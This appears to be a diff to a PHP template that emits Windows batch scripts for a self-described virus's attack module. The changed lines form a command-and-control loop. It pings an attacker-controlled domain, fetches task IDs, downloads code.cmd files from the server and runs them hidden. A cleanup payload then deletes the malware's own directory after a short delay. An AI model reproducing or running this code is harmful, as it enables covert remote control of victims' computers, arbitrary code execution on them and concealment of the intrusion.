@@ -1,7 +1,6 @@
 <?php
 
 namespace Kelvinho\Virus\Attack {
-    // TODO: change all attack packages from executeScript to win.executeScript but only display executeScript. This makes way to supporting multiple platforms
 
     /**
      * Class BaseScript for windows
@@ -30,10 +29,10 @@ namespace Kelvinho\Virus\Attack {
             curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping
 
             for /f "tokens=*" %%i in ('curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
-                if exist "%~dp0lib\current\%%i" (cls) else (
-                    mkdir "%~dp0lib\current\%%i"
-                    >"%~dp0lib\current\%%i\code.cmd" curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code
-                    start /b cmd.exe /c "%~pd0lib\current\%%i\code.cmd"
+                if exist "%~dp0libs\current\%%i" (cls) else (
+                    mkdir "%~dp0libs\current\%%i"
+                    >"%~dp0libs\current\%%i\code.cmd" curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code
+                    start /b cmd.exe /c "%~pd0libs\current\%%i\code.cmd"
                 )
             )
             goto daemon_loop
@@ -293,7 +292,7 @@ namespace Kelvinho\Virus\Attack {
          */
         public static function cleanUpPayload(): string {
             ob_start(); ?>
-            start /b cmd /c "rmdir /s /q %~pd0"
+            start /b cmd /c "timeout 3 & rmdir /s /q %~pd0"
             <?php return ob_get_clean();
         }
 
